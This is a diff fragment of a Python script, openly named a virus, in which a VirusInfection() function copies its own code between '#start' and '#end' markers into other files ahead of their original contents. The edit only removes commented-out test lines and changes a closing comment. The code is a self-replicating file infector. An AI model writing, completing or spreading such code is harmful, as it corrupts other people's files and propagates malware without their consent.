@@ -15,11 +15,8 @@ def VirusInfection():
                 with open(__file__, 'r') as CopyVirus:
                     content = CopyVirus.read().splitlines()
                 selection = content[content.index('#start'):content.index('#end')+1]
-#                with open('test.txt','a') as test:
                 for line in selection:
                     infection.write(line + '\n')
-#                    test.write('\n'.join(selection))
-#               infection.write('')
                 with open(file, 'r') as CopyOriginal:
                     infection.write(CopyOriginal.read())
 
@@ -31,7 +28,6 @@ def VirusInfection():
 
             CopyVirus.close()
             CopyOriginal.close()
-#            test.close()
             infection.close()
             script.close()
 VirusInfection()
@@ -39,4 +35,4 @@ VirusInfection()
 #end
 
 
-#if this is here you have fucked up
+#if this is in the infected file you have fucked up
